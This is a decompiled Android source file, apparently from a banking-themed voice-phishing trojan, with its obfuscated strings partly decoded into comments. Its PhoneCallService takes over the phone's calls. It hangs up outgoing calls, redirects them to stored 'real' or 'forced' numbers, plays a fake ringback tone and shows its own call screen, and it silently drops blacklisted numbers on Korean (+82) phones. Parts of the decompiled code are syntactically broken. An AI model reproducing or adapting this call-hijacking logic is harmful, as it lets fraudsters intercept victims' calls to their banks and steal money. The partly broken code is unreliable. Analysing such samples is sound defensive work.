package com.wish.lmbank.phone;

import android.annotation.TargetApi;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.telecom.Call;
import android.telecom.DisconnectCause;
import android.telecom.InCallService;
import android.text.TextUtils;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.bean.CallLogBean;
import com.wish.lmbank.bean.LimitPhoneNumberBean;
import com.wish.lmbank.common.Constants;
import com.wish.lmbank.receiver.CallLogHelper;
import com.wish.lmbank.receiver.TelePhoneReceiver;
import com.wish.lmbank.utils.DateFormatUtils;
import com.wish.lmbank.utils.HandlerUtils;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SettingUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;

import java.util.Date;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/phone/PhoneCallService.class */
@TargetApi(Build.VERSION_CODES.M)
public class PhoneCallService extends InCallService {
    public static final int CALL_IN = 1;
    public static final int CALL_OUT = 2;
    public static PhoneCallService callService;
    public static boolean isRunning;
    private final String TAG = PhoneCallService.class.getName();
    private final Call.Callback callback = new Call.Callback() { // from class: com.wish.lmbank.phone.PhoneCallService.1

        @Override // android.telecom.Call.Callback
        public void onStateChanged(Call call, int i) {
            String str;
            super.onStateChanged(call, i);
//             String m5998 = bb7d7pu7.m5998("RUkZAQYHDCoIBQUoCh0AHwAdEFNJ");
            String m5998 = ", phoneCallActivity: ";
            boolean z = false;
            if (i == 4) {
                StringBuilder sb = new StringBuilder();
                sb.append(TAG);
//                 sb.append(bb7d7pu7.m5998("RUkGBzodCB0MKgEIBw4MDUVJOj0oPSw2KCo9ID8sNkVJjv3cgcb0jObejsnoU0k"));
                sb.append(", onStateChanged, STATE_ACTIVE_, 电话号码: ");
                sb.append(PhoneCallService.this.getCallPhone(call));
                sb.append(m5998);
                sb.append(AppStartV.phoneCallActivity != null);
                LogUtils.callLog(sb.toString());
                if (AppStartV.phoneCallActivity == null) {
                    return;
                }
                AppStartV.isPlayColorRing = false;
                AppStartV.phoneCallActivity.callActive(call);
            } else if (i == 7) {
                DisconnectCause disconnectCause = call.getDetails().getDisconnectCause();
                if (disconnectCause == null) {
                    str = "";
                } else {
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append(disconnectCause.getCode());
//                     sb2.append(bb7d7pu7.m5998("Ng"));
                    sb2.append("_");
                    sb2.append(disconnectCause.getReason());
                    str = sb2.toString();
                }
//                 boolean value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), false);
                boolean value = SharedPreferencesUtils.getValue("KEY_IS_FORWARDING_HAND_UP", false);
//                 String value2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), "");
                String value2 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", "");
                String callPhone = PhoneCallService.this.getCallPhone(call);
                StringBuilder sb3 = new StringBuilder();
                sb3.append(PhoneCallService.this.TAG);
//                 sb3.append(bb7d7pu7.m5998("RUkGBzodCB0MKgEIBw4MDUVJgOnzgcb0j__EjNXpRUkKCAUFOQEGBwxTSQ"));
                sb3.append(", onStateChanged, 通话断开, callPhone: ");
                sb3.append(callPhone);
                sb3.append(m5998);
                if (AppStartV.phoneCallActivity != null) {
                    z = true;
                }
                sb3.append(z);
//                 sb3.append(bb7d7pu7.m5998("RUkNABoKBgcHDAodOwwIGgYHNlNJ"));
                sb3.append(", disconnectReason_: ");
                sb3.append(str);
//                 sb3.append(bb7d7pu7.m5998("RUkAGi8GGx4IGw0ABw4hCAcNPBlTSQ"));
                sb3.append(", isForwardingHandUp: ");
                sb3.append(value);
//                 sb3.append(bb7d7pu7.m5998("RUkPBhseCBsNAAcOOgEGHjkBBgcMU0k"));
                sb3.append(", forwardingShowPhone: ");
                sb3.append(value2);
                LogUtils.callLog(sb3.toString());
                if (AppStartV.phoneCallActivity != null) {
                    AppStartV.phoneCallActivity.callDisconnected(!value, callPhone);
                } else if (value) {
//                     String value3 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), "");
                    String value3 = SharedPreferencesUtils.getValue("KEY_FORWARDING_PHONE", "");
                    if (!TextUtils.isEmpty(value3) && value2.equals(callPhone)) {
                        SettingUtils.startActivityForCall(PhoneCallService.this, value3);
                    }
                }
            }
        }
    };

    /* JADX WARN: Code restructure failed: missing block: B:11:0x008c, code lost:
//         if (gv00l3ah.mvdt7w.bb7d7pu7.m5998("DwYbCgwN").equals(r0.getType()) != false) goto L11;
        if (gv00l3ah.mvdt7w."forced".equals(r0.getType()) != false) goto L11;
     */
    @Override // android.telecom.InCallService
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public void onCallAdded(Call call) {
        int i;
        String isForced;
        String str;
        String str2;
        boolean z = false;
        String callPhone = getCallPhone(call);
        String callPhone2 = getCallPhone(call);
        if (PhoneCallManager.call != null && PhoneCallManager.call.getState() == Call.STATE_ACTIVE) {
            call.reject(false, null);
            StringBuilder sb = new StringBuilder();
            sb.append(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJgOnzgcb0jdHEj_TMjv3cj-Xrj__ERUmO_dyBxvSM5t6OyehTSQ") + callPhone2);
            if (TelePhoneReceiver.mCallLogBean != null) {
                CallLogBean callLogBean = TelePhoneReceiver.mCallLogBean;
                if (!bb7d7pu7.m5998("DwYbHggbDQAHDg").equals(callLogBean.getType())) {
                }
                callLogBean.setDuration((long) Math.ceil(((DateFormatUtils.getDateInterval(TelePhoneReceiver.callStartTime, new Date()) * 1.0d) / 1000.0d) * 1.0d));
                CallLogHelper.addCallLog(callLogBean);
                sb.append(bb7d7pu7.m5998("RUkEKggFBSUGDisMCAdTSQ") + callLogBean.toString());
                if (Constants.mCallLogList.size() > 0) {
                    HandlerUtils.getMainThreadHandler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            CallLogHelper.execute();
                        }
                    }, 500L);
                }
            }
            LogUtils.callLog(sb.toString());
            return;
        }
        if (call.getState() == Call.STATE_RINGING) {
            i = 1;
        } else {
            i = call.getState() == Call.STATE_CONNECTING ? 2 : 0;
        }
        String str3 = bb7d7pu7.m5998("GhAaHQwENhoeAB0KAQ");
        String str4 = bb7d7pu7.m5998("Bgc");
        String value = SharedPreferencesUtils.getValue(str3, str4);
        LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJCggFBT0QGQxTSQ") + i + bb7d7pu7.m5998("RUkKCAUFOh0IHQxTSQ") + call.getState() + bb7d7pu7.m5998("RUmO_dyBxvSM5t6OyehTSQ") + callPhone2 + bb7d7pu7.m5998("RUkaHgAdCgFTSQ") + value);
        if (i != 0) {
            if (i == 2) {
                StringBuilder sb2 = new StringBuilder();
                LimitPhoneNumberBean isForwarding = SettingUtils.isForwarding(callPhone2);
                if (isForwarding != null) {
                    str2 = isForwarding.getRealPhoneNumber();
                    if (isForwarding.getSpecial() == 1) {
                        z = true;
                    }
                } else {
                    str2 = "";
                }
                sb2.append(this.TAG + bb7d7pu7.m5998("RUkPBhseCBsNAAcOOQEGBwxTSQ") + str2 + bb7d7pu7.m5998("RUkAGjoZDAoACAVTSQ") + z + bb7d7pu7.m5998("RUkKCAUFKA0NDA05AQYHDFNJ") + callPhone2);
                if (str4.equals(value) && !z && !TextUtils.isEmpty(str2) && !bb7d7pu7.m5998("WFhb").equals(callPhone2)) {
                    sb2.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztKP5euP_8Q"));
                    call.disconnect();
                    SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), true);
                    SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), callPhone2);
                    SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), str2);
                    AppStartV.isPlayColorRing = true;
                    new TelePhoneReceiver.ColorRingThread(callPhone2).start();
                }
                LogUtils.callLog(sb2.toString());
                isForced = callPhone2;
            } else {
                AppStartV.isCustomDialer = false;
                boolean isBlackList = SettingUtils.isBlackList(callPhone2);
                if (str4.equals(value) && isBlackList) {
                    call.disconnect();
                    LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJgNL4jPnkjOT8RUmO_dyBxvRTSQ") + callPhone2);
                    return;
                }
                isForced = SettingUtils.isForced(callPhone2);
                if (!str4.equals(value) || TextUtils.isEmpty(isForced)) {
                    isForced = callPhone2;
                } else {
                    LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByoIBQUoDQ0MDUVJjNXTjOHfgOnzgcb0RUkKCAUFLwYbCgwNOgEGHjZTSQ") + isForced);
                }
            }
            call.registerCallback(this.callback);
            PhoneCallManager.call = call;
            if (AppStartV.isCustomDialer) {
                isForced = AppStartV.customDialerCallNumber;
                str = AppStartV.customDialerForwardingNumber;
            } else {
                str = callPhone;
            }
            PhoneActivity.actionStart(this, isForced, str, i, bb7d7pu7.m5998("KggFBToMGx8ACgw"));
        }
    }

    @Override // android.telecom.InCallService
    public void onCallRemoved(Call call) {
        String callPhone = getCallPhone(call);
        StringBuilder sb = new StringBuilder();
//         sb.append(this.TAG + bb7d7pu7.m5998("RUkGByoIBQU7DAQGHwwNRUmO_dyBxvSM5t6OyehTSQ") + callPhone);
        sb.append(this.TAG + ", onCallRemoved, 电话号码: " + callPhone);
        if (PhoneCallManager.call == call) {
//             sb.append(bb7d7pu7.m5998("RUk5AQYHDCoIBQUkCAcIDgwbRwoIBQVJVEkHHAUF"));
            sb.append(", PhoneCallManager.call = null");
            call.unregisterCallback(this.callback);
            PhoneCallManager.call = null;
        }
        LogUtils.callLog(sb.toString());
    }

    @Override // android.telecom.InCallService, android.app.Service
    public boolean onUnbind(Intent intent) {
        super.onUnbind(intent);
        isRunning = false;
//         LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGBzwHCwAHDQ"));
        LogUtils.callLog(this.TAG + ", onUnbind");
        return false;
    }

    @Override // android.telecom.InCallService, android.app.Service
    public IBinder onBind(Intent intent) {
        isRunning = true;
//             LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGBysABw0"));
        LogUtils.callLog(this.TAG + ", onBind");
        return super.onBind(intent);
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
//         LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkGByobDAgdDA"));
        LogUtils.callLog(this.TAG + ", onCreate");
        callService = this;
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        StringBuilder sb = new StringBuilder();
        sb.append(this.TAG);
//         sb.append(bb7d7pu7.m5998("RUkGBy0MGh0bBhA"));
        sb.append(", onDestroy");
        LogUtils.callLog(sb.toString());
        callService = null;
    }

    public static PhoneCallService getInstance() {
        return callService;
    }

    public String getCallPhone(Call call) {
        if (call == null || call.getDetails().getHandle() == null) {
            return "";
        }
        String schemeSpecificPart = call.getDetails().getHandle().getSchemeSpecificPart();
        if (TextUtils.isEmpty(schemeSpecificPart)) {
            return "";
        }
//             String replaceAll = schemeSpecificPart.replaceAll(bb7d7pu7.m5998("RA"), "").replaceAll(bb7d7pu7.m5998("SQ"), "");
        String replaceAll = schemeSpecificPart.replaceAll("-", "").replaceAll(" ", "");
        String str = replaceAll;
//             if (replaceAll.startsWith(bb7d7pu7.m5998("QlFb"))) {
        if (replaceAll.startsWith("+82")) {
//                 str = bb7d7pu7.m5998("WQ") + replaceAll.substring(3);
            str = "0" + replaceAll.substring(3);
        }
        return str;
    }
}
